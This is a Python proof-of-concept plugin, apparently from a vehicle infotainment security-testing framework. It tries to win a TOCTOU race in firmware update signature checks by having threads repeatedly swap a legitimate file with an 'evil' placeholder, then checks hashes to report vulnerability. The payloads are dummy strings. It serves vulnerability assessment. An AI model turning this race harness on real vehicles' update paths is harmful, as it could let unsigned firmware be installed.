"""
PoC Name: Firmware Update TOCTOU Race
Identifier: CWE-367
Component: Multiple
Category: Advanced
Severity: Critical
CVSS: 8.1
Description: 固件更新签名验证TOCTOU竞态条件
Prerequisites: 攻击者能够在更新进行时持续操作本地挂载或修改文件路径 (如在拥有低权限 Shell 或物理更换 USB)。
F_FW_Update_TOCTOU.py <target_update_dir>
"""
import sys
import os
import time
import shutil
import threading
import hashlib
from iv_plugin_base import IVIVulnerabilityPlugin

class FwUpdateToctouPlugin(IVIVulnerabilityPlugin):
    meta_display_id = "POC-ADV-006"
    meta_poc_name = "FW Update TOCTOU"
    meta_cve_id = "CWE-367"
    meta_severity = "Critical"
    meta_protocol = "rf"
    meta_target_os = ["all"]
    meta_required_params = ["target_dir"]
    is_disruptive = False
    meta_destructive_level = "Safe"

    def check_prerequisites(self):
        self.watch_dir = self.params.get("target_dir", "/tmp/ivi_update_mnt")
        self.copied_artifact = self.params.get("copied_artifact")
        return True

    def _sha256(self, path):
        h = hashlib.sha256()
        with open(path, "rb") as handle:
            for chunk in iter(lambda: handle.read(65536), b""):
                h.update(chunk)
        return h.hexdigest()

    def exploit(self):
        self.logger.info("准备发起 Firmware 更新签名检验的 TOCTOU 竞争攻击...")
        
        # 很多车载系统会在读取 .zip / .bin 并验证公钥时有一个短暂的空当
        # 这种脚本不断利用 os.rename 替换合法和非法的文件
        
        watch_dir = self.watch_dir
        os.makedirs(watch_dir, exist_ok=True)
        
        target_file = os.path.join(watch_dir, "update.bin")
        legit_file = os.path.join(watch_dir, "legit.bin")
        evil_file = os.path.join(watch_dir, "evil.bin")
        
        self.logger.info(f"监控目录: {watch_dir}")
        self.logger.info("生成用于利用的合法签名文件与恶意木马文件...")
        
        with open(legit_file, "w") as f: f.write("VALID_SIGNED_OEM_FIRMWARE")
        with open(evil_file, "w") as f: f.write("MALICIOUS_ROOT_SHELL_PAYLOAD")
        legit_hash = self._sha256(legit_file)
        evil_hash = self._sha256(evil_file)
        
        # 初始时放置合法文件，准备骗过第一次 Check
        if not os.path.exists(target_file):
            shutil.copy(legit_file, target_file)
            
        self.logger.info("初始化高速线程劫持...")
        self.race_running = True
        self.swaps = 0
        
        # 定义竞争函数，利用文件系统 I/O 间隙
        def racer():
            while self.race_running:
                try:
                    # 不断覆盖: 合法 -> 恶意 -> 合法 -> 恶意，期望在 Check 到 Use 之间正好落在恶意状态
                    shutil.copy(legit_file, target_file)
                    shutil.copy(evil_file, target_file)
                    self.swaps += 2
                except:
                    pass
                    
        self.logger.info("开始多线程极速替换 (Race Condition) 期望绕过验证！(持续 10 秒)")
        threads = []
        for i in range(5):
            t = threading.Thread(target=racer)
            t.daemon = True
            t.start()
            threads.append(t)
            
        for i in range(10):
            sys.stdout.flush()
            time.sleep(1)
            
        self.race_running = False
        for t in threads: t.join()
        
        self.logger.info(f"[+] 竞争测试结束，10秒内完成了 {self.swaps} 次文件闪换。")
        if self.copied_artifact and os.path.exists(self.copied_artifact):
            copied_hash = self._sha256(self.copied_artifact)
            if copied_hash == evil_hash:
                return {
                    "status": "success",
                    "vulnerable": True,
                    "details": f"Observed copied artifact {self.copied_artifact} hash matches evil payload after {self.swaps} swaps."
                }
            if copied_hash == legit_hash:
                return {
                    "status": "success",
                    "vulnerable": False,
                    "details": f"Observed copied artifact {self.copied_artifact} still matches the legitimate firmware after {self.swaps} swaps."
                }

        return {
            "status": "success",
            "vulnerable": False,
            "details": f"已执行 {self.swaps} 次竞态替换，但未提供 copied_artifact 或未捕获到目标复制结果，无法严格确认漏洞。"
        }

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("F_FW_Update_TOCTOU.py <target_update_dir>")
        sys.exit(1)
    plugin = FwUpdateToctouPlugin({"target_dir": sys.argv[1]})
    plugin.run_verify()
